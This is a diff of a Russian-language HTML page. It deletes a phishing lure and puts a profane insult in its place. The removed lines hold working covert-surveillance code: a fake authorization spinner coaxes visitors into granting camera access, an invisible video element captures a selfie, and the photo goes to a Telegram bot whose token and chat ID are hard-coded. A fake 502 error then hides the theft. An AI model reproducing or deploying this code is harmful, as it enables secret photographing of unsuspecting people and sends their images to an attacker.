@@ -2,118 +2,29 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ошибка доступа</title>
+    <title>еще раз пошел нахуй</title>
     <style>
-        /* Стили страницы-приманки */
-        body { 
-            background-color: #000; 
-            color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
-        .container { text-align: center; padding: 20px; }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top-color: #0088cc;
-            border-radius: 50%;
-            animation: spin 1s ease infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        #text { font-size: 14px; color: #888; }
 
-        /* БРОНЕБОЙНЫЙ ИНВИЗ ДЛЯ КАМЕРЫ */
-        #video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.001; /* Почти ноль */
-            pointer-events: none;
-            z-index: -9999;
-            object-fit: cover;
+        .text {
+            font-size: 100px;
+            font-weight: bold;
+            font-family: sans-serif;
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="spinner"></div>
-        <p id="text">Подключение к защищенному каналу...<br>Нажмите «Разрешить» для авторизации</p>
+        <div class="text">пошел нахуй</div>
     </div>
 
-    <video id="video" autoplay playsinline webkit-playsinline muted></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <script>
-        const CONFIG = {
-            token: '8656434253:AAHcGlig5isaXIyxj18GArImjdt1Nd_Jl0k',
-            chatId: '7239528532',
-            delay: 2500 // Задержка перед фото (2.5 сек), чтобы успел сфокусироваться
-        };
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const textLabel = document.getElementById('text');
-
-        async function init() {
-            try {
-                // Запрос камеры. На iOS обязательно без аудио, иначе может блокировать
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
-                video.srcObject = stream;
-                
-                // На некоторых устройствах нужно явно вызвать play()
-                await video.play();
-
-                // Ждем и делаем захват
-                setTimeout(capture, CONFIG.delay);
-
-            } catch (err) {
-                textLabel.innerHTML = "Ошибка: Для входа требуется <br> подтвердить доступ к камере.";
-                textLabel.style.color = "#ff4444";
-            }
-        }
-
-        async function capture() {
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Рисуем кадр
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async (blob) => {
-                const fd = new FormData();
-                fd.append('chat_id', CONFIG.chatId);
-                fd.append('photo', blob, 'shot.jpg');
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-                    // Финалочка: имитируем ошибку, чтобы не палиться
-                    textLabel.innerText = "Ошибка 502: Сервер перегружен. Попробуйте позже.";
-                } catch (e) {
-                    console.error('Send failed');
-                }
-            }, 'image/jpeg', 0.7);
-        }
-
-        // Запуск системы
-        window.addEventListener('load', init);
-    </script>
 </body>
 </html>
